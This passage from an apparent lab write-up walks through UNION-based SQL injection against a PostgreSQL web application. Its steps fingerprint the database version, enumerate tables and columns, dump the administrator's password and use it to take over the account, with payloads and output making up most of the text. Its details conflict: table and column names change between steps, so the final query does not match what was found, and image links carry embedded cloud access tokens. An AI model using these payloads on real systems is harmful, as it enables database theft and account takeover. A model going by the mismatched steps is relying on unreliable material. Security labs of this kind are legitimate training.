# Listing the database contents on non-Oracle databases.

**both column 1 and 2 contain data type string.**

**STEP #3**

Query the database to retrieve database type.

```text
' UNION SELECT version(), NULL--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e18d5687-f060-464c-b24e-b96b3edd6468/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667MORO5OL%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215418Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCSBvQfvHZV5JDtHYTEABVveE%2BS9c9vUE%2B3wXp95ab1wIgF8lnLwu23XNUXeHdcctYYvuRjv2hlmbZ%2BaUFGWgcfYoqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDIFMzIIvuPl7rujmUircA2vOn8BW7PdfQoQ27iyQUcPMJVQ6iNBby3eZHaD8LpFIlafW%2FA2Xa3yehWNAXKw%2BPNVjwcBps3ybSkYjqKESxIWOGKv7AibwrNZisFJQ%2FRBcGHzZSPPHiqUwDVma3aPYiubs2WzFzSUWIImA16SquQinzY10NU1ttLnmCTYCIdFQ2e%2BL2BNra0gIAyUZzZgB7k2OEeX7uvBjDfQD0fmVTjNiTCDxWv4StGS9ZnjsOSQXtuUFkWvKCl%2B%2B0ZVF9HedN4Vf2h8ErF6FCNQgPu654AqcRRxMPeZM%2Fx9i5B8HnpvTDZ%2FLr%2BQ5VfyRP0%2FXNtQE37BFx8h0yc%2FHdLgP2TabjZpfwI%2BJNdEKepzalATL8SCCJXGQ%2FpCphgcCCb1Dmk0eh5d8m2S7B2jal8kRwqORw%2BadLFhegJb%2BlFFo2BE10JLaYeddKc7XgpXOXnDT95dPzItLUPZ9r3g8p3cVa8qtH%2FN4lQDwop%2Fr2r16B1b0d%2BmZZTbcg7rp1XDXM61FkaXu80uwB%2FAxG%2Fnqij43X3WdyIq9lp0ottl9IfXB30cgCv0FXg6D%2Bec69BoYC0C%2FWrVfjQefdAY%2BuHASgAEhPpUcE20BQQww%2Bbr9dZ5Nt4kTw2ei5QRXeRdAgZJMqhmlMJaEo9QGOqUBSlJ0T6b6dmoTYck7vySSa5siNLh9WfoTzpV8AFs7aT8WH7GTAbQ1LIPKYbC7bIU8pdGKU1ELgMTX86NHa583or0ZljYCVtCx6I0Gm7aQlSRQgQYZKDKyGS1i33di7q6lmXORYaQAwo65oYsb%2FU7lCWoAbTReCxpzxwmpqRhZFkJAMzcbKK276FHYtEr8Uk%2F7Bf3VvD%2FrAUmp%2B5DhGvsU4NnxrIim&X-Amz-Signature=9545c4e8c4ccf5215d7326b765389b008ccf721e81a70f4ff876c994b3f44dc3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**It returns:**

```text
PostgreSQL 11.12 (Debian 11.12–1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0–18+deb9u1) 6.3.0 20170516, 64-bit
```

**Database type: PostgreSQL**

**STEP #4**

Determine the table names.

![](https://miro.medium.com/v2/resize:fit:700/0*4vUM6NT3J_FxIyFW)

```text
' UNION SELECT table_name, NULL FROM information_schema.tables
```

![](https://miro.medium.com/v2/resize:fit:700/0*5_92Rm85mDwlIX-Z)

Let’s search for a table that contains usernames and passwords.

![](https://miro.medium.com/v2/resize:fit:700/0*JfNplyrNCXGFTbAd)

There is a table named `users_wfixez`** **this might be the table we are looking for. So let’s try retrieving columns of that table.

**STEP #5**

Determine the column names of the table `users_wfixez`

```text
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_wfixez'--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cfe0361c-45a8-48ec-a043-1c0b65e51441/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667MORO5OL%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215418Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCSBvQfvHZV5JDtHYTEABVveE%2BS9c9vUE%2B3wXp95ab1wIgF8lnLwu23XNUXeHdcctYYvuRjv2hlmbZ%2BaUFGWgcfYoqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDIFMzIIvuPl7rujmUircA2vOn8BW7PdfQoQ27iyQUcPMJVQ6iNBby3eZHaD8LpFIlafW%2FA2Xa3yehWNAXKw%2BPNVjwcBps3ybSkYjqKESxIWOGKv7AibwrNZisFJQ%2FRBcGHzZSPPHiqUwDVma3aPYiubs2WzFzSUWIImA16SquQinzY10NU1ttLnmCTYCIdFQ2e%2BL2BNra0gIAyUZzZgB7k2OEeX7uvBjDfQD0fmVTjNiTCDxWv4StGS9ZnjsOSQXtuUFkWvKCl%2B%2B0ZVF9HedN4Vf2h8ErF6FCNQgPu654AqcRRxMPeZM%2Fx9i5B8HnpvTDZ%2FLr%2BQ5VfyRP0%2FXNtQE37BFx8h0yc%2FHdLgP2TabjZpfwI%2BJNdEKepzalATL8SCCJXGQ%2FpCphgcCCb1Dmk0eh5d8m2S7B2jal8kRwqORw%2BadLFhegJb%2BlFFo2BE10JLaYeddKc7XgpXOXnDT95dPzItLUPZ9r3g8p3cVa8qtH%2FN4lQDwop%2Fr2r16B1b0d%2BmZZTbcg7rp1XDXM61FkaXu80uwB%2FAxG%2Fnqij43X3WdyIq9lp0ottl9IfXB30cgCv0FXg6D%2Bec69BoYC0C%2FWrVfjQefdAY%2BuHASgAEhPpUcE20BQQww%2Bbr9dZ5Nt4kTw2ei5QRXeRdAgZJMqhmlMJaEo9QGOqUBSlJ0T6b6dmoTYck7vySSa5siNLh9WfoTzpV8AFs7aT8WH7GTAbQ1LIPKYbC7bIU8pdGKU1ELgMTX86NHa583or0ZljYCVtCx6I0Gm7aQlSRQgQYZKDKyGS1i33di7q6lmXORYaQAwo65oYsb%2FU7lCWoAbTReCxpzxwmpqRhZFkJAMzcbKK276FHYtEr8Uk%2F7Bf3VvD%2FrAUmp%2B5DhGvsU4NnxrIim&X-Amz-Signature=a77c3620d8363bf5a7e9253518d87f3e5bcb0706b6e2b377309b9f588e58860b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**There are two columns in the table **`users_hwlzhs`**.**

`username_wbdvqp`

`password_zfxnbv`

**STEP #6**

Retrieve the administrator’s password from the database.

```text
'+UNION+SELECT+password_xvbkii,username_wwmyan+FROM+users_wfixez--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/a70b723f-9acb-4142-81e1-e06c44bcadef/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667MORO5OL%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215418Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCSBvQfvHZV5JDtHYTEABVveE%2BS9c9vUE%2B3wXp95ab1wIgF8lnLwu23XNUXeHdcctYYvuRjv2hlmbZ%2BaUFGWgcfYoqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDIFMzIIvuPl7rujmUircA2vOn8BW7PdfQoQ27iyQUcPMJVQ6iNBby3eZHaD8LpFIlafW%2FA2Xa3yehWNAXKw%2BPNVjwcBps3ybSkYjqKESxIWOGKv7AibwrNZisFJQ%2FRBcGHzZSPPHiqUwDVma3aPYiubs2WzFzSUWIImA16SquQinzY10NU1ttLnmCTYCIdFQ2e%2BL2BNra0gIAyUZzZgB7k2OEeX7uvBjDfQD0fmVTjNiTCDxWv4StGS9ZnjsOSQXtuUFkWvKCl%2B%2B0ZVF9HedN4Vf2h8ErF6FCNQgPu654AqcRRxMPeZM%2Fx9i5B8HnpvTDZ%2FLr%2BQ5VfyRP0%2FXNtQE37BFx8h0yc%2FHdLgP2TabjZpfwI%2BJNdEKepzalATL8SCCJXGQ%2FpCphgcCCb1Dmk0eh5d8m2S7B2jal8kRwqORw%2BadLFhegJb%2BlFFo2BE10JLaYeddKc7XgpXOXnDT95dPzItLUPZ9r3g8p3cVa8qtH%2FN4lQDwop%2Fr2r16B1b0d%2BmZZTbcg7rp1XDXM61FkaXu80uwB%2FAxG%2Fnqij43X3WdyIq9lp0ottl9IfXB30cgCv0FXg6D%2Bec69BoYC0C%2FWrVfjQefdAY%2BuHASgAEhPpUcE20BQQww%2Bbr9dZ5Nt4kTw2ei5QRXeRdAgZJMqhmlMJaEo9QGOqUBSlJ0T6b6dmoTYck7vySSa5siNLh9WfoTzpV8AFs7aT8WH7GTAbQ1LIPKYbC7bIU8pdGKU1ELgMTX86NHa583or0ZljYCVtCx6I0Gm7aQlSRQgQYZKDKyGS1i33di7q6lmXORYaQAwo65oYsb%2FU7lCWoAbTReCxpzxwmpqRhZFkJAMzcbKK276FHYtEr8Uk%2F7Bf3VvD%2FrAUmp%2B5DhGvsU4NnxrIim&X-Amz-Signature=6d042a14859c6f24b52ba555ec4f6aca4b0eba9d892f72dcb375297f6339fd4d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

|  |  |
|---|---|
| 9kn123cwvo54vzhicsns | administrator |

Use the administrator’s password to gain administrator’s access to the web application.
